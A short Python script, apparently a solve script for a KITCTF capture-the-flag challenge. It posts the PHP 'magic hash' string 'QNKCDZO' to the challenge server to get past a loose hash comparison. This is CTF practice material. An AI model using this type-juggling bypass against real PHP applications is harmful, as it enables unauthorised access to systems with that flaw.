#!/usr/bin/env python3
import requests

url = "https://grandtown-of-charged-liberty.gpn23.ctf.kitctf.de/"
magic = "QNKCDZO"

print(requests.post(url, data=magic).text)
